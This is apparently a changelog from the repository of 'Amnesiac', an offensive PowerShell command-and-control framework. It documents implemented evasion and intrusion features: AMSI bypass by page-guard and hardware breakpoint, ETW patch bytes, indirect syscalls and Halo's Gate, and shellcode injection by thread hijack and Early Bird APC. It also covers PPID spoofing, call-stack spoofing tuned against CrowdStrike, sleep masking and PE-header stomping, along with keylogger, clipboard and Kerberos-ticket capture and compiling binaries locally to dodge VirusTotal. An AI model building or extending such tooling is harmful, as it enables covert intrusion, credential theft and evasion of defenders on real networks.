- *Context: Operators doing internal lab testing may want disk artifacts for debugging. `diskmode on` preserves that capability without making it the default.*

**Added `$global:AmnesiacArtifacts` in-memory store**
- Hashtable with keys: `Keylogger`, `Screenshots`, `Clipboard`, `TGTs`, `Downloads`
- Keylogger output, screenshots, clipboard data, TGT data buffered in operator memory
- *Context: Data captured on targets must return to the operator, but writing it to disk on the target or operator machine creates forensic evidence. In-memory buffering on operator side is the right default.*

**Added `artifacts` session command**
- Lists all in-memory artifact types and counts
- Shows keylogger line count, screenshot count, clipboard snippet count, TGT entries, download entries
- *Context: Operators need visibility into what has been captured before deciding whether to persist it.*

**Added `save <type>` session command**
- Types: `keylogger`, `screenshots`, `clipboard`, `tgts`, `all`
- Writes only the requested artifact type to disk (requires `diskmode on` or uses a temp path)
- *Context: Operators need to selectively persist captured data without a blanket disk-write policy.*

**Gated `exe` payload format behind `diskmode`**
- Warns and blocks if operator tries to use `exe` format with `diskmode off`
- *Context: The exe format writes a compiled binary to disk. Incompatible with the disk-free operational model — requires explicit opt-in.*

---

## [Implemented] — Layer 2: Payload Extensions
> Commits: `3086509`, `5121cb1`, `ff16ca6`

**Session-unique `EndMarker` and `BufferSize`**
- `$global:EndMarker` = random 8-char alphanumeric string (replaces all hardcoded `#END#`)
- `$global:BufferSize` = random from {512, 1024, 2048, 4096} (replaces hardcoded 1028)
- All pipe read/write loops and payload generation reference these globals
- *Context: The fixed string `#END#` and 1028-byte buffer are fingerprints that network and memory scanners can use to identify Amnesiac sessions. Session-unique values eliminate this static indicator.*

**Added `New-PayloadScript` modular builder**
- Parameters: `-AmsiTechnique`, `-EtwTechnique`, `-SblTechnique`, `-Obfuscation` (0–3), `-JitterMs`, `-EnvKeys` hashtable, `-Launcher`
- Assembles bypass snippets, jitter, env-key checks, pipe client code, gzip+base64 wrapper, and launcher wrapper in sequence
- Replaces `New-StealthScript` as the canonical payload generator
- *Context: The original `New-StealthScript` was monolithic and couldn't be extended without rewriting it. The builder model allows independent selection of bypass techniques, obfuscation levels, and launcher types.*

**Added `Get-PayloadLauncher -Vector <name>`**
- Vectors: `ps` (powershell.exe -EncodedCommand), `wmi` (WMI one-liner), `schtask` (schtasks /create), `com` (Shell.Application COM object)
- Returns a launcher string wrapper for the gzip payload
- *Context: CS process tree analysis is one of its strongest detection mechanisms. `powershell.exe` spawned by `cmd.exe` or `sc.exe` is high-signal. Launching via WMI (`WmiPrvSE.exe` parent) or Task Scheduler (`svchost.exe` parent) significantly reduces the behavioral score.*

**Added `launcher` command**
- Cycles through `ps → wmi → schtask → com` vectors
- Current vector shown in prompt / OPSEC banner
- *Context: Same as above — operators need to switch launch vectors between targets.*

**Added AES-128 CBC pipe channel encryption**
- `Protect-PipeMessage`: encrypts a string with AES-128 CBC, prepends IV, returns base64
- `Unprotect-PipeMessage`: decodes base64, extracts IV prefix, decrypts
- `Get-PskDerivedKey`: SHA-256 hash of passphrase, first 16 bytes used as AES key
- *Context: Named pipe data traverses SMB in plaintext unless SMB signing/sealing is enforced. A session-level AES encryption layer ensures command content is not visible to network monitoring even if SMB traffic is inspected.*

**Wired `New-PayloadScript` into `Start-Listener` and `Start-GListener`**
- `stealth` format now calls `New-PayloadScript` instead of `New-StealthScript`
- All payload generation goes through the builder — consistent bypass technique selection
- *Context: Ensures the OPSEC-configured bypass techniques actually appear in generated payloads.*

**Added `Send-Module` framing protocol**
- Streams tool source (or binary base64) over the named pipe in fixed-size chunks with `CHUNK:` / `ENDCHUNK` framing
- Target reassembles chunks and executes via `[scriptblock]::Create()` (for PS) or `[Reflection.Assembly]::Load()` (for binary)
- *Context: The target never fetches anything from the network and never writes anything to disk. The entire tool execution happens in target memory.*

---

## [Implemented] — Layer 3: In-Memory Tool Delivery
> Commits: `ecad16c`, `ff16ca6`

**Added `$global:ToolCache` hashtable**
- Populated at startup from embedded blobs, then local `Tools\` directory
- Keys are tool names; values are PS source strings or binary base64 blobs
- *Context: The current model downloads tool scripts from GitHub to the target's disk on demand. This creates both a disk IOC and anomalous outbound traffic — a near-certain EDR alert.*

**Added `Initialize-ToolCache` function**
- Loads embedded core tools (gzip+base64 blobs baked into Amnesiac.ps1)
- Scans local `Tools\` directory and adds all `.ps1` files to the cache
- Reports cache size to OPSEC banner
- *Context: All tools pre-loaded at operator startup means no network activity during an engagement.*

**Added `New-EmbeddedTool` helper**
- Gzip-compresses and base64-encodes a tool file for embedding as a constant
- Used during development to produce the embedded core tool blobs
- *Context: Embedding tools in the main script eliminates the dependency on the local Tools\ directory.*

**Embedded core tool tier in Amnesiac.ps1**
- Tools embedded as gzip+base64 constants: `SimpleAMSI`, `NETAMSI`, `Token-Impersonation`, `Invoke-SMBRemoting`, `Invoke-WMIRemoting`, `Find-LocalAdminAccess`
- *Context: These six tools are used in virtually every engagement. Embedding guarantees availability with zero network dependency.*

**Added `modules` and `modules reload` commands**
- `modules`: lists all tools in `$global:ToolCache` with source tier (embedded/local)
- `modules reload`: rescans `Tools\` directory and updates cache
- *Context: Operators need visibility into which tools are available before needing them mid-engagement.*

---

## [Implemented] — Layer 4: Operational Guardrails
> Commits: `c64ba46`

**Added `engagement [nondomained|domained|reset]` command**
- `nondomained`: sets defaults for non-domain-joined operator (named pipe listener mode, detached flag guidance)
- `domained`: sets defaults for assumed-breach scenario
- `reset`: clears profile back to unconfigured
- Profile stored in `$global:EngagementProfile`
- *Context: Non-domain-joined and assumed-breach scenarios have different requirements. Manually configuring these each session is error-prone.*

**Added `Test-NetworkLogonToken` function**
- Checks calling process token for logon type 9 (NewCredentials) — set by `runas /netonly`
- Returns `$true` if a network logon token is present, `$false` otherwise
- Called at startup in `nondomained` mode; warns if token is missing
- *Context: Operating against a domain from a non-joined machine requires a Kerberos ticket in the token. If the operator forgot to use `runas /netonly`, all domain operations will silently fail. Early detection prevents wasted time.*

**Added `key <hostname|domain|user> <value>` and `key clear` commands**
- Stores env key values in `$global:EnvKeys` hashtable
- Keys are embedded into payload by `New-PayloadScript` as pre-execution checks
- Payload refuses to run if hostname/domain/username doesn't match
- *Context: Accidental payload execution on the wrong machine wastes a callback opportunity, creates noise, and may alert the target organisation. Environment keying ensures the payload only executes on the intended target.*

**Added `psk <passphrase>` command**
- Derives AES-128 key from passphrase via SHA-256 + truncate to 16 bytes
- Stores in `$global:PipeKey` for use by `Protect-PipeMessage` / `Unprotect-PipeMessage`
- *Context: Same as AES pipe encryption motivation — PSK management is the operator-facing interface for that system.*

**Added `Show-OpsecBanner` function**
- Displays at Amnesiac startup: disk mode, engagement profile, token status, tool cache count, session EndMarker/BufferSize, launcher vector, loader status
- *Context: Operators need to confirm their OPSEC configuration is correct before generating payloads. A single-screen summary at startup prevents configuration mistakes.*

---

## [Implemented] — Layer 2b: AmnesiacLoader C# Assembly
> Commit: `e5d4f45` | DLL: 23040 bytes | SHA256: `E68860E9D094150AA58AE4BFF601D65C41923B5BB28330F2AF3CE85D87E96A11`

**Rewrote `AmnesiacLoader/Build.ps1`**
- Uses `csc.exe` (`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe`) — no .NET SDK required
- Creates `bin\` directory before compilation
- Compiles all six source files with `/unsafe /optimize+ /debug-`
- Adds `/r:System.Core.dll` for `AesManaged` (required for SleepMask)
- Writes updated `$AmnesiacLoaderB64` back to `Amnesiac.ps1` with UTF-8 BOM preserved
- *Context: The target operator machine has no .NET SDK. csc.exe ships with .NET Framework and is available on any Windows machine with PS installed.*

**Implemented `AmnesiacLoader/Bypass.cs`**
- `PatchAmsiPageGuard()`: sets PAGE_GUARD on `AmsiScanBuffer`, installs VEH that intercepts STATUS_GUARD_PAGE_VIOLATION — sets RAX=0 (S_OK), writes 1 to the AMSI_RESULT pointer (6th arg at [RSP+0x30]), redirects RIP to return address, re-applies PAGE_GUARD. No byte modification of the function.
- `PatchAmsiHardwareBreakpoint()`: sets DR0 to `AmsiScanBuffer` via helper thread (suspend/GetContext/SetContext/resume on calling thread), VEH catches EXCEPTION_SINGLE_STEP — same RAX/result/RIP manipulation as pageguard handler.
- `PatchEtwEventWrite()`: byte-patches `EtwEventWrite` in ntdll to `31 C0 C3 90` (xor eax,eax; ret; nop) after making the page PAGE_READWRITE.
- *Context: PAGE_GUARD and hardware breakpoint techniques leave no trace in AmsiScanBuffer bytes — integrity checks that scan for patched bytes find nothing. ETW patch is the most reliable method when the process starts with low scrutiny.*

**Implemented `AmnesiacLoader/Loader.cs`**
- `SyscallResolver`: walks ntdll EAT (DataDirectory[0] at PE32+ offset `peOffset + 0x88`), builds sorted list of Nt* RVAs for Halo's Gate neighbor scanning. Extracts SSN from unhooked `4C 8B D1 B8 xx xx 00 00` prelude; falls back to ±20 neighbor scan to derive SSN by offset for hooked stubs. Allocates 33-byte RWX syscall stubs with a spoofed ntdll return frame (gadget from `CallStack.GetGadget()`) pushed before the syscall instruction.
- `Injector.InjectShellcode(pid, shellcode)`: opens target process via `NtOpenProcess` stub, allocates RW region via `NtAllocateVirtualMemory`, writes shellcode via `NtWriteVirtualMemory`, protects RX via `NtProtectVirtualMemory`, finds a thread via `CreateToolhelp32Snapshot`, suspends via `NtSuspendThread`, hijacks RIP via `NtGetContextThread`/`NtSetContextThread`, resumes.
- `Injector.InjectNewProcess(processPath, shellcode, spoofParentPid)`: PPID spoof via `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` in `STARTUPINFOEX` (GCHandle.Alloc pinned parent handle for stable pointer during `UpdateProcThreadAttribute`), creates process `CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT`, allocates+writes+protects shellcode via NT stubs, queues shellcode as Early Bird APC via `NtQueueApcThread`, resumes main thread.
- *Context: CS monitors specific Win32 API call patterns at the kernel level. Indirect syscalls bypass userland hooks and produce call chains that look like legitimate ntdll operations. Early Bird APC fires before any user code — the process is fully suspended when the APC is queued, so CS sees no suspicious code execution from a running thread.*

**Implemented `AmnesiacLoader/CallStack.cs`**
- `GetGadget()`: scans ntdll `.text` section for a `RET` (0xC3) byte preceded by `NOP` (0x90) or `RET` or `POP RBP` (0x5D) or `POP RBX` (0x5B). Returns stable gadget address cached across calls.
- Gadget address inserted by `SyscallResolver.AllocateStub()` as a fake return address before the syscall instruction, producing a one-frame spoof chain pointing into legitimate ntdll code.
- *Context: CS telemetry records the call stack at injection events. A call stack originating from PS internals is high-signal. Spoofed frames showing ntdll origin reduces the behavioral score.*

**Implemented `AmnesiacLoader/SleepMask.cs`**
- `MaskedSleep(ms, regionBase, regionSize)`: generates random AES-128 key+IV via `RNGCryptoServiceProvider`, stores in a separate `VirtualAlloc(READWRITE)` key page, reads region bytes via `Marshal.Copy`, AES-128 CBC PKCS7 encrypts via `AesManaged`, writes ciphertext to region (RW temporarily via `VirtualProtect`), marks region `PAGE_NOACCESS`, sleeps, restores RW, decrypts in-place, zeroes+frees key page, `Array.Clear()` on all key material.
- *Context: CS performs memory scanning for known shellcode patterns. If the implant's memory is encrypted and marked non-accessible during sleep, the scanner finds nothing. Critical for long-dwell operations.*

**Implemented `AmnesiacLoader/Stomper.cs`**
- `ConcealLoadedAssembly(asm, targetDllName)`: gets CLR-allocated base via `Marshal.GetHINSTANCE(asm.ManifestModule)`, finds donor DLL via `GetModuleHandle` (preferred name or auto-select from: bcryptprimitives, msasn1, cryptsp, wldp, profapi, combase), reads donor PE header size (DOS + NT headers + section table, rounded to page boundary), copies donor header bytes over assembly header after `VirtualProtect(PAGE_READWRITE)`.
- *Context: A `[Reflection.Assembly]::Load(bytes)` result shows as an anonymous heap allocation to memory scanners. Overwriting the PE header with a legitimate DLL's header makes it appear file-backed.*

**Implemented `AmnesiacLoader/UnmanagedPS.cs`**
- `InjectUnmanagedPS(pid, psScript)`: runs `psScript` in the current process via SMA Runspace (finds or loads `System.Management.Automation` from AppDomain/GAC, creates Runspace via reflection, opens, creates pipeline, invokes, closes).
- `SpawnUnmanagedPS(processPath, psScript, spoofParentPid)`: UTF-16LE base64-encodes `psScript`, builds `powershell.exe -EncodedCommand` bootstrap, delivers via `InjectNewProcess`.
- *Context: Running PS code in-process via SMA Runspace avoids spawning `powershell.exe` — which is a high-signal process creation event. The target's already-loaded AmnesiacLoader instance can execute arbitrary PS code without creating a new process.*

**Embedded `$AmnesiacLoaderB64` constant in `Amnesiac.ps1`**
- 30720-char base64 blob representing the compiled 23040-byte DLL
- `Show-OpsecBanner` reports embedded size in KB
- *Context: If the assembly were written to disk as a DLL, it would be scanned on write and create a forensic artifact. Embedding in the PS script and loading from memory bypasses both.*

**Added `load loader` session command**
- Delivers `$AmnesiacLoaderB64` to an active session via `Send-Module` framing protocol
- Target loads via `[Reflection.Assembly]::Load([Convert]::FromBase64String($b64))`
- Calls `[AmnesiacLoader.Stomper]::ConcealLoadedAssembly($_la)` immediately after to conceal the loaded assembly
- *Context: The assembly must be loaded on the target before any AmnesiacLoader methods can be called. `load loader` is the one-step delivery command.*

**Added `Migrate ps <pid>` and `Migrate ps new <proc>` session commands**
- `Migrate ps <pid>`: calls `[AmnesiacLoader.Injector]::InjectUnmanagedPS($pid, $payload)` on target
- `Migrate ps new <proc>`: calls `[AmnesiacLoader.Injector]::SpawnUnmanagedPS($proc, $payload, $ppid)` with explorer.exe as PPID
- *Context: Operators need to migrate the implant to a different process or spawn a clean process. The `ps` sub-commands use CLR hosting; other `Migrate` sub-commands use shellcode injection.*

---

## [Implemented] — Plan 4: Amnesiac_ShellReady.ps1 Sync

Ported all stealth-overhaul changes (Plans 1-3) to `Amnesiac_ShellReady.ps1`:

- **Preamble**: Prepended `$AmnesiacLoaderB64` constant and 14 helper functions (`Get-AmsiBypassSnippet`, `Get-EtwBypassSnippet`, `Get-SblBypassSnippet`, `New-PayloadScript`, `Get-PayloadLauncher`, `Initialize-DiskStructure`, `Initialize-ToolCache`, `New-EmbeddedTool`, `Send-Module`, `Test-NetworkLogonToken`, `Protect-PipeMessage`, `Unprotect-PipeMessage`, `Get-PskDerivedKey`, `Show-OpsecBanner`) -- ShellReady transform applied (Write-Output, no colour params, `-` for box-drawing, `--` for em-dash)
- **Initialization**: Replaced inline folder-creation block with `Initialize-DiskStructure`; added stealth-overhaul globals (`$global:DiskMode`, `$global:AmnesiacArtifacts`, `$global:ToolCache`, `$global:EndMarker`, `$global:BufferSize`, `$global:PayloadConfig`, `$global:EngagementProfile`, `$global:PSKPhrase`, `$global:PSKBytes`); added `Initialize-ToolCache` and `Show-OpsecBanner` calls
- **Protocol constants**: Replaced 66 x `"#END#"` (both operator-side equality checks and target-script embedded sends) with `$global:EndMarker`; replaced 25 x `1028` with `$global:BufferSize`
- **Main loop**: Updated `toggle` to include `stealth` format cycling and `exe` DiskMode warning; added handlers for `diskmode`, `artifacts`, `save`, `modules`, `payload`, `psk`, `engagement`
- **Session loop**: Updated session `toggle` to include `stealth` format; added `load loader`, `Migrate ps new <path>`, `Migrate ps <pid>` handlers before the existing `Migrate *` handler

---

---

## [Implemented] — Plan 3: Fixes, Multi-Frame Call Stack, Extended Tests

**Fixed `load loader` delivery path** (commit: `fix(loader): load loader`)
- Removed broken framing-chunk-then-load-command sequence: chunks were sent before `$loadCmd` tried to read them, leaving the pipe dry; then a redundant second send was attempted after the operator blocked waiting for a response that never arrived
- Replaced with a single direct pipe write: `$_la=[Reflection.Assembly]::Load([Convert]::FromBase64String('$AmnesiacLoaderB64'));[AmnesiacLoader.Stomper]::ConcealLoadedAssembly($_la)`
- *Context: The previous implementation was silently a no-op on the target — AmnesiacLoader was never loaded despite the operator seeing a success message. This fix makes `load loader` actually work.*

**Multi-frame call stack spoofing** (commit: `feat(loader): multi-frame call stack spoofing`)
- `CallStack.cs`: Added `GetKernelbaseGadget()` — scans `kernelbase.dll` .text section for RET gadget using shared `FindGadgetInModule()` helper; falls back to ntdll gadget if kernelbase not loaded
- `Loader.cs`: Changed `AllocateStub(ssn, ntdllGadget, kbaseGadget)` — stub now 48 bytes; pushes two fake frames: kernelbase gadget at [rsp+8] (outermost) and ntdll gadget at [rsp] (adjacent to syscall); call stack at syscall shows `[kernelbase] -> [ntdll] -> syscall`
- Rebuilt and re-embedded AmnesiacLoader DLL (23552 bytes vs prior 23040)
- *Context: A single ntdll RET gadget as the only spoofed frame is identifiable — legitimate Windows API call chains have multiple frames through kernelbase/kernel32. Two levels is meaningfully more convincing.*

**Extended Pester test coverage** (commits: `test: extend coverage`, `test: fix test quality issues`)
- `Migrate ps <pid>` and `Migrate ps new <proc>` regex patterns: 4 tests
- `Send-Module` framing protocol with mock writer/reader: cache miss returns false, correct BEGIN/CHUNK/END framing, chunk decodes to original content, EndMarker ack returns true: 4 tests
- AmnesiacLoader build artifact integrity: bin directory, DLL exists, MZ header, `$AmnesiacLoaderB64` matches on-disk DLL: 4 tests
- `load loader` command handler: blob non-null, single direct send with `::Load` and `ConcealLoadedAssembly`, no framing markers: 2 tests
- Test quality: $Matches capture before Should, base64 round-trip content assertion, __MODULE_BEGIN__ byte-length field assertion, BeforeEach ToolCache isolation, BeforeAll for build artifact scope
- *Total: 28 → 42 tests*

---


---

## [2026-05-25] feat(native-bypass): compile patchless AMSI+ETW bypass binaries locally

### Background
The msi-pageguard-veh-master directory contains the native patchless AMSI+ETW bypass
(PAGE_GUARD VEH technique). These binaries are NOT hosted on public GitHub to avoid
VirusTotal indexing. They must be compiled locally and served from the operator HTTP server.

### Build blockers resolved
- **Windows 11 SDK 10.0.26100.0** dropped metahost.h and mscoree.h (CLR hosting headers
  removed since ~SDK 19041). Fix: wrote minimal shim headers in the source directory.
- **metahost.h shim** — defines ICLRMetaHost, ICLRRuntimeInfo, CLRCreateInstance,
  all GUIDs. Includes local mscoree.h instead of the missing system header.
- **mscoree.h shim** — defines ICorRuntimeHost with correct 19-method vtable order
  (matches published COM spec: CreateLogicalThreadState...CurrentDomain). Defines
  CLSID_CorRuntimeHost, IID_ICorRuntimeHost.
- **guids.cpp** — defines all five CLSID/IID values as EXTERN_C const (CLSID_CLRMetaHost,
  IID_ICLRMetaHost, IID_ICLRRuntimeInfo, CLSID_CorRuntimeHost, IID_ICorRuntimeHost).
  Required because shim headers declare them extern but do not define them.
- **mscoree.lib missing** — not in SDK 26100. Generated from mscoree.def using lib.exe
  /def:mscoree.def /machine:x64. Def file lists the exports actually present in
  C:\Windows\System32\mscoree.dll.
- **mscorlib.tlb** — copied from C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ to
  source directory so #import "mscorlib.tlb" resolves.
- **AmnesiacBridge.cs — InitialSessionState.ExecutionPolicy not in PS5.1 SMA** —
  ExecutionPolicy property was added in PowerShell Core 6.0. Fix: removed the property
  assignment; added Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted -Force
  via a separate PowerShell.Create() call before the main script run.
- **AmnesiacBridge.cs — C# 6+ syntax** — the old csc.exe in .NET Framework 4.0 does not
  support expression-bodied members. Fix: use Roslyn csc.exe from VS2022 Build Tools
  (MSBuild\Current\Bin\Roslyn\csc.exe) with /langversion:7.3.

### Outputs (all local, not committed to repo)
- msi_bypass.dll (103 KB) — injectable DLL: PAGE_GUARD bypass only, no CLR dependency
- msi_bypass_test.exe (138 KB) — standalone test: decodes XOR+b64 payload from data.txt,
  installs bypass, loads .NET assembly via CLR hosting, invokes entry point
- mnesiac_launcher.exe (140 KB) — full operator launcher: downloads AmnesiacBridge.dll +
  Amnesiac_ShellReady.ps1 from operator HTTP server, installs AMSI+ETW bypass, starts CLR,
  loads bridge into AppDomain, runs Amnesiac interactively via PS Runspace
- AmnesiacBridge.dll (10 KB) — C# Runspace host: ConsoleHost/ConsoleUI/ConsoleRawUI
  wrappers, Launcher.Run(string) entry point called by native CLR hosting code

### Reproducibility
Build-Native.ps1 in the source directory contains all build commands. Run from PowerShell
as: cd amsi-pageguard-veh-master; .\Build-Native.ps1
